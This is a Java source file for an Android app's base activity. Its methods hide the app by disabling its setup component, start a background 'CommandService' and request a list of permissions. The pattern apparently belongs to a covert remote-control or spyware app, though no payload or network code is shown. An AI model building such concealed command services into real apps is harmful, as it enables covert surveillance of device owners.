package com.example.lutter.activities;

import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.PersistableBundle;
import android.widget.Toast;


import androidx.appcompat.app.AppCompatActivity;

import com.example.lutter.Constants;
import com.example.lutter.CommandService;


import pub.devrel.easypermissions.EasyPermissions;

import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;


public class BaseActivity extends AppCompatActivity {

    @Override
    public void onCreate(Bundle savedInstanceState, PersistableBundle persistentState) {
        super.onCreate(savedInstanceState, persistentState);
    }

    protected void hideApp() {
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, SetupActivity.class);
        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }

    protected void startClient() {
        Intent i = new Intent(this, CommandService.class);
        startService(i);
    }

    protected void requestPermissions() {
        Intent i = new Intent(this, PermissionsActivity.class);
        i.addFlags(FLAG_ACTIVITY_NEW_TASK);
        startActivity(i);
    }

    protected boolean hasPermissions() {
        return EasyPermissions.hasPermissions(this, Constants.PERMISSIONS);
    }
}
